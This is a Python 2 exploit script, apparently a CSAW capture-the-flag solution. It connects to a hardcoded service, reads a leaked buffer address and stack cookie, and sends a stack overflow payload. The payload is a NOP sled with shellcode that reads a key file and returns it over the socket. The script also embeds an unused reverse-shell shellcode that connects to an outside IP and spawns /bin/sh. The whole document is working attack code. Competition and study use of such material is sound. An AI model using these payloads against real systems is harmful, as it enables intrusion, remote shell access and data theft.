#!/usr/bin/env python

import socket
import struct

ip = '128.238.66.212'
port = 31338

shellcode = ("\xeb\x2b\x31\xc0\xb0\x05\x5b\x31\xc9\xcd\x80\x89\xc6\x4c\xb0\x03\x89\xf3\x89\xe1\x31\xd2\x42\xcd\x80\x92\xb0\x04\x31\xdb\xb3\x04\x89\xe1\xcd\x80\x85\xd2\x75\xe6\x31\xc0\x40\xcd\x80\xe8\xd0\xff\xff\xff\x2e\x2f\x6b\x65\x79\x00")

shell = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2"+
"\xb0\x66\xb3\x01\x51\x6a\x06\x6a"+
"\x01\x6a\x02\x89\xe1\xcd\x80\x89"+
"\xc6\xb0\x66\x31\xdb\xb3\x02\x68"+
"\x52\xe9\x76\xed\x66\x68\x1f\x90\x66\x53\xfe"+
"\xc3\x89\xe1\x6a\x10\x51\x56\x89"+
"\xe1\xcd\x80\x31\xc9\xb1\x03\xfe"+
"\xc9\xb0\x3f\xcd\x80\x75\xf8\x31"+
"\xc0\x52\x68\x6e\x2f\x73\x68\x68"+
"\x2f\x2f\x62\x69\x89\xe3\x52\x53"+
"\x89\xe1\x52\x89\xe2\xb0\x0b\xcd"+
"\x80")

			 
print "**************************************************************"
print "*                     CSAW - Exploit 2                       *"			 
print "**************************************************************"
print
	
print "[+] Connecting to %s:%d"%(ip,port)	
soc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
soc.connect((ip,port))			 

print "[+] Getting leaked info"
bufferAddr = soc.recv(4)
cookie = soc.recv(4)
print "    buffer address : %08x"%(struct.unpack('<L', bufferAddr))
print "    cookie         : %08x"%(struct.unpack('<L', cookie))
soc.recv(1024)

exploit = "\x90"*48
exploit += shellcode
exploit += "\x90"*(2000-len(shellcode))
exploit += cookie
exploit += "\x90"*12
exploit += bufferAddr
exploit += "\x90"*12
exploit += "\n"

print "[+] Sending exploit (len %d)"%(len(exploit))
soc.send(exploit)

print "[+] Printing key"
print soc.recv(1024)

print "[+] Pwned !"
